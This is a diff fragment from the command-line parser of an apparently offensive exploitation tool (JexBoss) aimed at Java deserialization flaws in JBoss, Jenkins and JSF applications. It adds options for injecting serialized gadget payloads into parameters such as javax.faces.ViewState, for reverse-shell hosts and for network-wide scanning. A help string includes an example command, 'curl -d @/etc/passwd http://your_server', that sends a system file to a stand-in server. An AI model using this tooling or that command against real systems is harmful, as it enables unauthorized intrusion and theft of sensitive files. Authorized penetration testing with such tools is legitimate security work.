+                                                             "(eg. 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
+    group_advanced.add_argument("--cmd", "-x",
+                                help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)"
+                                     , type=str, metavar='CMD')
+    group_advanced.add_argument("--windows", "-w", help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
+                                action='store_true')
+    group_advanced.add_argument("--post-parameter", "-H", help="Specify the parameter to find and inject serialized objects into it."
+                                                               " (egs. -H javax.faces.ViewState or -H oldFormData (<- Hi PayPal =X) or others)"
+                                                               " (DEFAULT: javax.faces.ViewState)",
+                                                                 default='javax.faces.ViewState', metavar='PARAMETER')
+    group_advanced.add_argument("--show-payload", "-t", help="Print the generated payload.",
+                                action='store_true')
+    group_advanced.add_argument("--gadget", help="Specify the type of Gadget to generate the payload automatically."
+                                                 " (DEFAULT: commons-collections3.1 or groovy1 for JenKins)",
+                                    choices=['commons-collections3.1', 'commons-collections4.0', 'groovy1'],
+                                    default='commons-collections3.1')
+    group_advanced.add_argument("--load-gadget", help="Provide your own gadget from file (a java serialized object in RAW mode)",
+                                metavar='FILENAME')
+    group_advanced.add_argument("--force", "-F",
+                                help="Force send java serialized gadgets to URL informed in -u parameter. This will "
+                                     "send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with "
+                                     "different Content-Types.",action='store_true')
+
+    # required parameters ---------------------------------------------------------------------------------------
     group_standalone.add_argument("-host", "-u", help="Host address to be checked (eg. -u http://192.168.0.10:8080)",
                                   type=str)
+
+    # scan's mode parameters ---------------------------------------------------------------------------------------
     group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
                             type=network_args, default='192.168.0.0/24')
     group_auto_scan.add_argument("-ports", help="List of ports separated by commas to be checked for each host "
@@ -662,14 +1060,17 @@ if __name__ == "__main__":
     group_auto_scan.add_argument("-results", help="File name to store the auto scan results", type=str,
                                  metavar='FILENAME', default='jexboss_auto_scan_results.log')
 
-    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)", type=str, metavar='FILENAME_HOSTS')
-    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str, metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')
+    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)",
+                                 type=str, metavar='FILENAME_HOSTS')
+    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str,
+                                 metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')
 
     gl_args = parser.parse_args()
 
     if gl_args.mode == 'standalone' and gl_args.host == None or \
         gl_args.mode == 'file-scan' and gl_args.file == None:
         banner()
+        print (help_usage())
         exit(0)
     else:
         configure_http_pool()
@@ -679,3 +1080,12 @@ if __name__ == "__main__":
         if gl_args.proxy and not is_proxy_ok():
             exit(1)
         main()
+
+if __name__ == '__testing__':
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": get_random_user_agent()}
+
+    timeout = Timeout(connect=1.0, read=3.0)
+    gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
+    _exploits.set_http_pool(gl_http_pool)
